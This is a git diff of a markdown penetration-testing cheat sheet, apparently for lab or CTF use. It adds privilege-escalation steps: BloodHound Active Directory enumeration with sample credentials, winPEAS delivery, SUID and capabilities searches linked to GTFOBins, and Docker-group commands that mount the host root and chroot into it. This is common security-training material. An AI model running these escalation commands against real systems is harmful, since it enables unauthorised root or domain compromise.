@@ -232,9 +232,7 @@ bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example
 2. Go to browser and typle:
 localhost:8080
 
-3. Enter username and password:
-Username: admin
-Password: <it will be same password as your kali password>
+3. Enter username and password to login
 
 4. Upload the JSON files
 ```
@@ -290,14 +288,59 @@ sudo cp /opt/winpeas/winPEASany.exe /mnt
 
 # Section 5. Privilege Escalation
 ## Windows Privilege Escalation
+- ACL Abuse Chain with BloodHound
 ```
-COMING SOON...
+# Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.
+
+# Example Workflow
+1. Gernerate JSON files from the Active Directory database
+bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example.com –c all
+
+# -u username
+# -p password
+# -d domain name
+# -ns nameserver (domain controller)
+# -c all (gather all json files)
+
+2. Go to browser and typle:
+localhost:8080
+
+3. Enter username and password to login
+
+4. Upload the JSON files
 ```
-## Linux Privilege Escalation
+- winPeas
 ```
-COMING SOON...
+1. Deliver the winpeas file to the target
+2. Run it
+3. Look for paths to escalate privileges
 ```
 
+## Linux Privilege Escalation
+- Set SUID
+```
+1. Find the files or executables with set SUID bit:
+find / -perm -u=s -type f 2>/dev/null
+
+2. Check the GTFOBins to find an exploit for that:
+https://gtfobins.org/
+```
+- Capabilities
+```
+1. Find the Capabilities:
+getcap -r / 2>/dev/null
+
+2. Check the GTFOBins to find an exploit for that:
+https://gtfobins.org/
+```
+- If an unprivileged user is a member of the Docker group, they can potentially gain full access to the host system.
+```
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/sh
+
+or
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+```
 
 # Section 6. Miscellaneous
 ### Wordlists
@@ -305,6 +348,10 @@ COMING SOON...
 /usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
 /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
+```
+Peass
+```
+/usr/share/peass
 ```
 
 
